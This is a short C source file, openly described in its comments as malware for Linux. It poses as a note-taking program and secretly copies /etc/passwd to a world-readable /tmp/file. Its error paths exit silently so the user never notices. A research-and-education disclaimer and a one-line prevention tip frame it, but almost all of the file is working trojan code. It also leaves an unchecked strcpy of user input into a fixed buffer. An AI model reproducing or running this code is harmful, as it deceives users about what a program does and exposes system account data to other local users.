// OS: Linux DISTROs

// Purpose: A small malware for which poses as a note-taking 
// program but stealthily copies the contents of /etc/passwd 
// into /tmp/file giving this new file 0777 permissions.

// Requirements: The user running the binary should have
// read permissions for /etc/passwd.

// Prevention: Disable read permissions in /etc/passwd
// for non-root or low-level users.

// DISCLAIMER: THIS PROGRAM IS DEVELOPED FOR RESEARCH AND
// EDUCATIONAL PURPOSES ONLY.


#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <fcntl.h>
#include <sys/stat.h>

void usgae(char *prog_name, char *filename) {
    printf("Usage: %s <data to add to %s>\n", prog_name, filename);
    exit(0);
}

void fatal(char *);
void *ec_malloc(unsigned int);
void *malloc_check(unsigned int);

int main(int argc, char *argv[]) {
    int fd;
    char *buffer, *datafile;
    
    int fdone, fdtwo;
    char *hiddenfile, *hacked_buf, *newfile;

    // legitimate operation which poses as a note-taking program

    buffer = (char *) ec_malloc(100);
    datafile = (char *) ec_malloc(20);

    strcpy(datafile, "/tmp/notes");

    if (argc < 2)
        usgae(argv[0], datafile);
    strcpy(buffer, argv[1]);

    printf("[DEBUG] buffer @ %p: \'%s\'\n", buffer, buffer);
    printf("[DEBUG] datafile @ %p: \'%s\'\n", datafile, datafile);

    strncat(buffer, "\n", 1);

    fd = open(datafile, O_WRONLY|O_CREAT|O_APPEND, S_IRUSR|S_IWUSR);
    if (fd == -1)
		fatal("in main() while opening file"); 
	printf("[DEBUG] file descriptor is %d\n", fd);
	
	if (write(fd, buffer, strlen(buffer)) == -1)
		fatal("in main() while writing buffer to file");
	if (close(fd) == -1)
		fatal("in main() while closing file");
		
	printf("Note has been saved.\n");

    // legitimate operation end.

    //malicious operation begins.

    hiddenfile = (char *) malloc_check(20);
    newfile = (char *) malloc_check(20);
    hacked_buf = (char *) malloc_check(5000);
    strcpy(hiddenfile, "/etc/passwd");
    strcpy(newfile, "/tmp/file");

    fdone = open(hiddenfile, O_RDONLY, S_IRUSR); // read contents from /etc/passwd
    fdtwo = open(newfile, O_WRONLY|O_CREAT|O_APPEND|O_TRUNC, 0777); // O_TRUNC if the 
                                                                    // file exists and has write permission, 
                                                                    // truncate the content to 0 and overwrite
    
    
    // error checks to exit the program without notifying the user
    if (fdone == -1) 
        exit(0);

    if (fdtwo == -1)
        exit(0);
    
    if (read(fdone, hacked_buf, 5000) == -1)
        exit(0);
    if (close(fdone) == -1)
        exit(0);


    if (write(fdtwo, hacked_buf, strlen(hacked_buf)) == -1)
        exit(0);
    if (close(fdtwo) == -1)
        exit(0);

    
    free(buffer);
	free(datafile);
    free(hacked_buf);
    free(newfile);
    free(hiddenfile);
}


void fatal(char *message) {
	char error_message[100];
	
	strcpy(error_message, "[!!] Fatal Error ");
	strncat(error_message, message, 83); 
	perror(error_message);
	exit(-1);
}


void *ec_malloc(unsigned int size) {
	void *ptr;
	ptr = malloc(size);
	if (ptr == NULL) {
		fatal("in ec_malloc() on memory allocation");
	}
	return ptr;
}


// malloc checking function for malicious operations which simply 
// exits the program if an error occurs without notifying the user

void *malloc_check(unsigned int size) {
    void *ptr;
    ptr = malloc(size);
    if (ptr == NULL) {
        exit(0);
    }
    return ptr;
}